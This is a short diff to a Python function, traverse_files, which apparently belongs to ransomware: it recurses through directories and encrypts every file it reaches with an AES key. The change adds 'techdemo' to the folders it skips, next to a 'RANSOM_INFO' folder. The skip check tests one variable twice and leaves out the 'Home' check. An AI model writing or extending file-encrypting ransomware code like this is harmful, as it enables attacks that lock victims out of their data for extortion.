@@ -59,12 +59,13 @@ def traverse_files(nwd, aes_key, depth):
             req1 = 'Home' in os.path.basename(os.path.normpath(path))
             req2 = 'home' in os.path.basename(os.path.normpath(path))
             req3 = 'RANSOM_INFO' in os.path.basename(os.path.normpath(path))
+            req4 = 'techdemo' in os.path.basename(os.path.normpath(path))
 
             if not os.path.isdir(path):
                 encrypt_file(aes_key, path)
                 #print((depth*'  ') + "|F: " + os.path.basename(os.path.normpath(path)))
 
-            elif os.path.isdir(path) and not req2 and not req2 and not req3:
+            elif os.path.isdir(path) and not req2 and not req2 and not req3 and not req4:
                 traverse_files(path, aes_key, depth + 1)
                 #print("|" + (depth*'- ') + "D: " + os.path.basename(os.path.normpath(path)))
         files = []
